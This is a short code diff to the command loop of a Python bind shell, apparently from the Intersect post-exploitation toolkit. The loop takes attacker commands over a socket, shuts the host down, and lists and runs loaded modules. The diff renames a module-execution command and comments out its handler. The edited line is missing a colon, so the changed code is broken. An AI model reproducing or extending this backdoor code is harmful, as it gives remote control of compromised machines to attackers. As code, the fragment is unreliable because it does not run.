@@ -71,19 +71,20 @@ def bshell():
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
 
-        elif cmd == ("extask"):
+        elif cmd == ("exec"):
             conn.send(str(modList))
             conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
-        elif cmd.startswith("extask"):
-            getname = cmd.split(" ")
-            modname = getname[1]
-            if modname in modList is False:
-                conn.send("[!] Module not loaded!")
-            else:
-                conn.send("[+] Executing %s " % modname)
-                execmod = modname+"()"
-                execmod
+        elif cmd.startswith(":exec")
+            pass
+            #getname = cmd.split(" ")
+            #modname = getname[1]
+            #if modname in modList is False:
+            #    conn.send("[!] Module not loaded!")
+            #else:
+            #    conn.send("[+] Executing %s " % modname)
+            #    execmod = modname+"()"
+            #    execmod
 
         elif cmd == ('killme'):
             conn.send("[!] Shutting down shell!\n")
